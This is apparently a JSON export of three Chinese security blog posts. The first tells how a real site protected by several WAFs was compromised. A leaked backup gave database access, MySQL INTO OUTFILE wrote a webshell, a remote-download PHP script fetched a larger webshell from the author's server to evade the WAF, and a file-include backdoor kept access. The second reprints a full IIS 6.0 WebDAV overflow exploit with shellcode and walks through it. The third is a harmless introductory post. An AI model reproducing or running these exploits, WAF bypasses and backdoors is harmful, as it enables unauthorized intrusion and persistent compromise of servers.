[{"title":"利用MySQL的写文件+远程下载脚本绕过云锁拿shell","date":"2017-04-04T13:20:00.950Z","path":"2017/04/04/03/","text":"碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。 连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。 换思路，利用MySQL写文件函数，写shell进网站的目录，首先需要知道网站的绝对路径，利用thinkPHP的报错特性，爆出绝对路径。直接执行SQL语句 select ‘一句话’ into outfile ‘D://thinkhphp//xx//1.php’ 注意：云锁如果不检测写入的内容的话可以直接写明文， 但是最好写hex加密代码，那么代码就不需要单引号括起来，还要注意的就是，写绝对路径必须写两个“/”,除非写\\，否则会被转义。 本机测试，成功写入一句话，但是连接的时候被云锁拦截了，个人感觉可能是云锁拦截了post的特征，需要修改菜刀的连接特征，可惜我不会。.直接写入大马测试，nosafe的大马可以正常使用，直接写入大马，发现大马字符太大没办法写入，这时候利用95zz发的一个脚本，执行远程下载，他在文章中说因为云锁是拦截php代码的，例如&lt;? ?&gt;，的头部，所以远程下载的脚本是利用JavaScript转写php 1&lt;script language=\"php\"&gt; $a='http://远程地址/sss.txt';$b='file'.'_g'.'et_'.'contents';$b = $b($a);file_put_contents('file.php',$b); &lt;/script&gt; 这行代码是利用一个远程下载函数，将远程服务器的文件下载，并重新生成一个file.php的php代码，所以我们在自己的web服务器上放上大马的txt，配合利用MySQL的文件写入先生成一个远程下载的php，在直接访问这个php，生成一个php大马，测试通过，成功getshell，尝试提权，无法使用大部分cmd提权命令，目的只需要shell权限就好，没有深究，做了一个文件包含，固权，退之。 包含脚本：12345if(isset($_GET[\"id\"]))&#123;require_once('D:\\\\WWW\\\\web\\\\images\\\\load.jpg');&#125;注意闭合。","tags":[{"name":"绕过Waf","slug":"绕过Waf","permalink":"http://yoursite.com/tags/绕过Waf/"},{"name":"渗透思路","slug":"渗透思路","permalink":"http://yoursite.com/tags/渗透思路/"}]},{"title":"IIS6.0远程代码执行漏洞个人浅析","date":"2017-04-03T08:22:32.720Z","path":"2017/04/03/02/","text":"PS：不喜可以喷，要是要喷的有理由，这样你指出了我的错误，我也得到了学习何乐而不为？ IIS6.0远程代码执行的漏洞是发生在WebDav开启情况下发生的，当IIS6.0开启这个服务可以存在缓存区域溢出。 官方给出的exp： 1234567891011121314151617import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('192.168.5.128',88)) pay='PROPFIND / HTTP/1.1\\r\\nHost: 192.168.5.128:88\\r\\nContent-Length: 0\\r\\n'pay+='If: &lt;http://192.168.5.128:88/aaaaaaa'pay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'pay+='&gt;'pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://192.168.5.128:88/bbbbbbb'pay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'shellcode='\"VYhffffk4diFkDql02Dqm0D1CuEE5n3l0G3j3C0S1p02024B0W3y2G2u4D0k4q3c\".\"0615092E0T0H0l4s4u1k0A2p3G0Y3W3A0u2K2J0P2o4E3U2L370w3N5O3h2p1O2w1o3v4\".\"T3P4n1K3v4n0z3Y0S0M2k5L4J0m4Y2D103V2s4K4t0Q0U0P7o2L4P2O8K3r0j0y0N0s37\".\"2l0m5K0Y8M0S5p4V110Q2J182s7M2K344J3j04VYVTX10X41PZ41H4A4I1TA71TADVTZ3\".\"2PZNBFZDQC02DQD0D13DJEON4F1W9M490R0P0654E2M9Y2F64346K5K450115MN2G0N0\".\"B0L5C5DKO106737KO9W8P0O2L1L0P184E3U0Q8P1G3L5O9R601E671O9W343QOO113RJO\".\"LK8M640M1K3WOL1W4Y2O613V2I4K5C0R0S0PMO2O3W2O8K9R1Z1K0S1H3PLMKM5KKK8M0\".\"S4JJL15612J1267KM2K4D903K03VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQ\".\"AIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYA\".\"ZBABABABAB30APB944JB9K7YMY7Y7O1SKWKQ0X6QLT8Y2TMTJT1K3S7SKT013KLUKS3KL\".\"U3QJR1Y04MT4S1Y6L9UKTLX0I1P096TJPML5N0E5K4O6LMP07MW038R9WJT9K0J4M5NOK\".\"KKMS3N0L4L8S1N8NLW11JV1V6YKO1SMO1P2OMNKOMK4N8QOO0KKR104POLLZ3XLWJXML6\".\"SKN03MQMK0GMQ1ZLZ8K6Y4LKPA\";'pay+=shellcodepay+='&gt;\\r\\n\\r\\n'print paysock.send(pay) data = sock.recv(80960) print datasock.close 用原作者的话说，他的POC是利用3次溢出构建ROP链，绕过内存地址随机化，说实话我是听不懂的任何一个名词的，只了解字面上的意思，但是想了解原理，于是从exp代码分析 从上面的Python代码我们可以进行分析这个漏洞利用的整个过程，个人认为，就是利用了webdav服务的开启，可以进行更多的数据提交方式，默认的话是get,post,cookie，这几类，当然，如果开启接收任何提交方式的请求，那么可以利用put提交方式，直接写shell，类似的提交方式还有move，copy，del等等，但是上面的代码利用提交方式不是http自带的提交方式，而是利用是一个扩展协议，PROPFIND，而不是传统的http协议，propfind正常的情况下是查看属性的提交方式，当我们利用缓冲区域溢出，也就是当提交的数据，超出了程序能够承载的量那么就会导致程序出错，也就是造成了溢出。 从上面的代码我分析了一下，这个poc分为三个部分，导包指定目的IP就不用说了，直接按照自己的理解就是 第一个部分就是利用propfind的方式向服务器进行提交数据。 第二部分就提交的pay数据值就是一段缓冲区域溢出代码，看样子是一些占位比较大的符号进行了hex编码，当webdav接收这些参数的时候，会处理不过来，也就造成了数据溢出，我们提交的数据有一部分已经溢出了webdav程序的这个容器，溢出的数据都会在进程中，如果我们可以控制溢出的数据，那么我们可以进行一个代码执行。 第三个部分也就是我们要控制的溢出参数，上面的poc给定的值是“shellcode”，通过一些测试和询问发现，这个shellcode值可能是利用msf生成的一个payload，然后利用编码器，将代码编为“x86/unicode_upper”，因为本人小白，不太懂底层的东西，感觉这可能是内存或者底层能够识别的编码方式吧，通过这个poc，发现这个shellcode的作用就是在进程中溢出一个计算器的进程，用户权限是network，权限虽然小但是还是有很多可以利用的方法，通过检测发现，这个漏洞貌似只有支持PROPFIND的请求方法才会有效，个人测试了几个扩展协议没有成功溢出shellcode，或许是我的姿势不对吧,至少我这么尝试没有成功。 总结：这个漏洞的总体利用过程 检查服务器是否开启webdav服务【我们可以利用OPTIONS的请求方法进行判断服务器是否开启WEBDAV，且支持propfind的请求方法】 → 通过扩展协议propfind，向服务器发送一个缓冲区溢出代码和可控制的shellcode → 然后服务器接受到这个包发生了缓冲区溢出，将我们的shellcode溢出到了进程中。 那么利用这个漏洞，我们如果可以控制shllecode，是不是可以直接注入一个反弹shell的payload，或者说是一个远程木马，因为直接注入进程等于不用执行文件，绕过waf，等等，当然没有汇编基础还是不行的，所以只能慢慢学，问了问搞编程的朋友，是否可以直接利用这个漏洞写类似于远控程序，或者其他的后门的，他的回答是肯定可以的，具体的话涉及到内存的转换和储存过程，这些我们暂时不深究，因为只有实验才能给出答案，如果我成功了，我肯定会写出续文，虽然这个漏洞挺鸡肋，到此为止总结大概也完了。 以上是个人的愚见总结，其实感觉这个漏洞是挺有意思的，虽然现在用IIS6.0的服务器是越来越少了，但是我相信，在底层，有更多的漏洞都是基于“缓冲区域溢出”，并且常规的waf对此事无法拦截的【比如基于缓冲区域溢出的SQL注入攻击:) 】可惜无奈自己对底层的东西还是了解的太少了。要花时间去补习这些底层知识。 最后附上一个大牛写出来可利用msf直接加载攻击的exp，目前只针对Windows2003 R2版本有效，直接利用Metasploit把这个攻击载荷加入进去，set一下配置即可完成攻击，具体是返回一个network权限的shell。 MSF利用exp: 下载 参考文献：这篇确实讲的很详细，可以学到很多东西！http://www.tuicool.com/articles/7ziu6jE","tags":[{"name":"IIS6.0","slug":"IIS6-0","permalink":"http://yoursite.com/tags/IIS6-0/"},{"name":"代码执行漏洞","slug":"代码执行漏洞","permalink":"http://yoursite.com/tags/代码执行漏洞/"}]},{"title":"诞生日---第一篇博文","date":"2017-04-01T11:48:46.717Z","path":"2017/04/01/01/","text":"Hello，Word！在自己的摸索下，HEXO的博客终于搭建起来了，开这个博客有很多原因，感觉到不用博客都不好意思自己是搞IT得，开玩笑的，其实最重要还是只想让自己做个不浮躁的人，只有沉下心才能学到更多的东西，当然，不一定会有人关注，但是自己的小圈子内能够互相学习，就够了，很乐意结交更多的朋友，一起交流，而不是互相吹捧，因为那毫无意义。每个人都是从小白做起，这个圈子里面似乎并没有尽头，当你接触久了就会发现，这原来是个无底洞，因为技术本来就是没有尽头的，虽然洞很深而且还有很多的坑，可是依然有那么多人坚持着，也许为了好奇，也许为了￥￥，或许就是为了图一时兴起的快感无论你想得到的是什么 但是过程都是一样的。人活着不就是为了做自己想做的事情，虽然有制度，有规则约束着你，但是你照样可以看到”乌托邦”。 我很乐意分享自己的经验，也许没人看得到，但是至少自己去做了，如果有幸有人看到并且指出了我的错误，那我也学到了更多的东西，这样没什么不好的。 结语就像每一个时代里的人都觉得自己没有赶上一个好的时代一样。这里没有末路，你从不曾孤独。 ——韩寒 so Come on :)","tags":[{"name":"前言","slug":"前言","permalink":"http://yoursite.com/tags/前言/"}]}]